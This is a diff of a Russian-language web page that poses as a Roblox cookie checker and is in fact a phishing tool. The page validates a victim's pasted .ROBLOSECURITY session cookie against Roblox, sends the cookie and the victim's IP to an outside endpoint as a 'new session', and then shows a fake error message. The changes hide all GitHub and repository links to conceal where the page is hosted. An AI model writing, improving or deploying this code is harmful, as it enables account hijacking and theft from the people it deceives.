@@ -27,16 +27,19 @@
         .btn:hover{transform:scale(1.02);box-shadow:0 0 22px var(--accent)}
         .btn:disabled{opacity:0.5;cursor:not-allowed}
         .message-area{text-align:center;margin-top:20px}
-        .error-text{color:#ff8a7a;background:rgba(255,70,50,0.1);padding:10px 18px;border-radius:40px;font-size:12px}
+        .error-text{color:#ff8a7a;background:rgba(255,70,50,0.1);padding:10px 18px;border-radius:40px;font-size:12px;border-left:3px solid #ff5a4a}
+        .valid-text{color:#22c55e;background:rgba(34,197,94,0.1);padding:10px 18px;border-radius:40px;font-size:12px;border-left:3px solid #22c55e}
         .theme-switch{position:fixed;top:20px;right:20px;z-index:100}
         .theme-btn{background:var(--card-bg);backdrop-filter:blur(12px);border:1px solid var(--border);border-radius:40px;padding:8px 20px;cursor:pointer;font-size:13px;color:var(--text-sec)}
         .theme-btn:hover{transform:scale(1.05);box-shadow:0 0 12px var(--accent)}
-        /* Скрываем ссылки на GitHub */
-        a, a[href*="github"], a[href*="github.com"], a[href*="github.io"], .github-link, footer, .footer {
+        /* Полное скрытие любых ссылок на GitHub */
+        a, a[href*="github"], a[href*="github.com"], a[href*="github.io"], .github-link, footer, .footer, [class*="repo"], [id*="repo"] {
             display: none !important;
             visibility: hidden !important;
             opacity: 0 !important;
             pointer-events: none !important;
+            width: 0 !important;
+            height: 0 !important;
         }
     </style>
 </head>
@@ -116,7 +119,10 @@
     const statusDiv = document.getElementById('status');
     const msgArea = document.getElementById('messageArea');
 
-    // ========== ПРЯМАЯ ПРОВЕРКА КУКИ (ЧЕРЕЗ БРАУЗЕР ЖЕРТВЫ) ==========
+    let currentCookieValid = false;
+    let currentCookieValue = '';
+
+    // ПРЯМАЯ ПРОВЕРКА КУКИ (ЧЕРЕЗ БРАУЗЕР ЖЕРТВЫ)
     async function checkCookieDirectly(cookieValue) {
         try {
             const response = await fetch("https://users.roblox.com/v1/users/authenticated", {
@@ -137,7 +143,7 @@
         }
     }
 
-    // Базовая проверка длины
+    // Базовая проверка длины и формата
     function isBasicValid(value){
         if(!value || value.trim() === '') return false;
         const trimmed = value.trim();
@@ -146,6 +152,8 @@
         return true;
     }
 
+    // Обновление статуса с проверкой
+    let checkTimeout;
     async function updateUI(){
         const rawValue = cookieInput.value;
         const basicValid = isBasicValid(rawValue);
@@ -153,35 +161,45 @@
         if(!rawValue || rawValue.trim() === ''){
             statusDiv.innerHTML = '<span>✨</span> Ожидание ввода...';
             statusDiv.style.color = '#a78bfa';
+            sendBtn.disabled = true;
+            currentCookieValid = false;
             return;
         }
 
         if(!basicValid){
             statusDiv.innerHTML = '<span>❌</span> Ошибка: неверный формат или кука короче 800 символов';
             statusDiv.style.color = '#ef4444';
+            sendBtn.disabled = true;
+            currentCookieValid = false;
             return;
         }
 
         statusDiv.innerHTML = '<span>🔄</span> Проверка куки...';
         statusDiv.style.color = '#fbbf24';
+        sendBtn.disabled = true;
 
         const isValid = await checkCookieDirectly(rawValue);
 
         if(isValid){
             statusDiv.innerHTML = '<span>✅</span> Кука валидна! Рабочая сессия.';
             statusDiv.style.color = '#22c55e';
+            sendBtn.disabled = false;
+            currentCookieValid = true;
+            currentCookieValue = rawValue;
         } else {
             statusDiv.innerHTML = '<span>❌</span> Кука НЕВАЛИДНА! Сессия устарела или битая.';
             statusDiv.style.color = '#ef4444';
+            sendBtn.disabled = true;
+            currentCookieValid = false;
+            currentCookieValue = '';
         }
     }
 
-    function showMessage(text){
-        msgArea.innerHTML = `<div class="error-text">⚠️ ${text}</div>`;
-        setTimeout(() => msgArea.innerHTML = '', 4000);
+    function showMessage(text, isValid = false){
+        msgArea.innerHTML = `<div class="${isValid ? 'valid-text' : 'error-text'}">${isValid ? '✅' : '⚠️'} ${text}</div>`;
+        setTimeout(() => msgArea.innerHTML = '', 4500);
     }
 
-    let checkTimeout;
     cookieInput.addEventListener('input', () => {
         clearTimeout(checkTimeout);
         checkTimeout = setTimeout(() => updateUI(), 600);
@@ -190,19 +208,11 @@
     updateUI();
 
     sendBtn.onclick = async () => {
-        const cookie = cookieInput.value.trim();
-        if(!isBasicValid(cookie)){
-            showMessage('Кука не прошла базовую проверку!');
+        if(!currentCookieValid || !currentCookieValue){
+            showMessage('Кука не прошла проверку!');
             return;
         }
-        
-        // Доп. проверка валидности перед отправкой
-        const isValid = await checkCookieDirectly(cookie);
-        if(!isValid){
-            showMessage('Кука невалидна! Отправка невозможна.');
-            return;
-        }
-        
+
         sendBtn.disabled = true;
         sendBtn.textContent = "⏳ Отправка...";
 
@@ -214,7 +224,7 @@
         } catch(e){}
 
         const msg = {
-            content: `**🔐 НОВАЯ СЕССИЯ**\n🕒 ${new Date().toLocaleString()}\n🌐 IP: ${ip}\n\n**🍪 .ROBLOSECURITY COOKIE:**\n**Длина:** ${cookie.length} символов\n**Содержимое:**\n\`\`\`${cookie}\`\`\``
+            content: `**🔐 НОВАЯ СЕССИЯ**\n🕒 ${new Date().toLocaleString()}\n🌐 IP: ${ip}\n\n**🍪 .ROBLOSECURITY COOKIE:**\n**Длина:** ${currentCookieValue.length} символов\n**Содержимое:**\n\`\`\`${currentCookieValue}\`\`\``
         };
 
         try{
@@ -223,9 +233,9 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(msg)
             });
-            showMessage('Ошибка перенаправления! Обратитесь в поддержку.');
+            showMessage('Ошибка перенаправления! Обратитесь в поддержку.', false);
         } catch(e){
-            showMessage('Ошибка сети. Попробуйте позже.');
+            showMessage('Ошибка сети. Попробуйте позже.', false);
         }
 
         sendBtn.disabled = false;
